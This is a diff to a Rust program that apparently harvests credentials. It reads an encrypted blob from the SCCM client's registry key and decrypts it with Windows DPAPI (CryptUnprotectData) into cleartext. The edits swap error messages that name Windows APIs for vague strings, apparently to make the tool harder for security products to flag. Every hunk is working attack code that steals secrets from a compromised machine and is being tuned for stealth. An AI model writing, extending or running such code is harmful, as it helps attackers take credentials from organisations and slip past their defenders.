@@ -94,10 +94,10 @@ fn run() -> Result<(), &'static str> {
     let mut hkey: usize = 0;
     let rc = unsafe {
         reg_open_key_ex_a(HKEY_LOCAL_MACHINE, sccm_key.as_ptr() as *const i8, 0, KEY_READ, &mut hkey)
-    }.map_err(|_| "RegOpenKeyExA resolve")?;
+    }.map_err(|_| "resolve")?;
 
     if rc != ERROR_SUCCESS {
-        println!("[*] SCCM key not found — SMS client may not be installed");
+        println!("[*] key missing — SMS client may not be installed");
         return Ok(());
     }
 
@@ -108,7 +108,7 @@ fn run() -> Result<(), &'static str> {
     unsafe {
         reg_query_value_ex_a(hkey, sccm_value.as_ptr() as *const i8,
             core::ptr::null_mut(), &mut reg_type, core::ptr::null_mut(), &mut buf_size)
-    }.map_err(|_| "RegQueryValueExA resolve")?;
+    }.map_err(|_| "resolve")?;
 
     if buf_size == 0 {
         unsafe { let _ = reg_close_key(hkey); };
@@ -123,12 +123,12 @@ fn run() -> Result<(), &'static str> {
             core::ptr::null_mut(), &mut reg_type,
             encrypted.as_mut_ptr(), &mut buf_size,
         )
-    }.map_err(|_| "RegQueryValueExA(data) resolve")?;
+    }.map_err(|_| "resolve")?;
 
     unsafe { let _ = reg_close_key(hkey); };
 
     if rc2 != ERROR_SUCCESS {
-        return Err("RegQueryValueExA failed");
+        return Err("val query failed");
     }
 
     // SCCM stores an encrypted blob starting at offset 4 (skip DWORD length prefix)
@@ -152,10 +152,10 @@ fn run() -> Result<(), &'static str> {
             CRYPTPROTECT_UI_FORBIDDEN,
             &mut data_out,
         )
-    }.map_err(|_| "CryptUnprotectData resolve")?;
+    }.map_err(|_| "resolve")?;
 
     if rc3 == 0 || data_out.pb_data.is_null() {
-        return Err("CryptUnprotectData failed");
+        return Err("dpapi failed");
     }
 
     let cleartext_len = data_out.cb_data as usize;
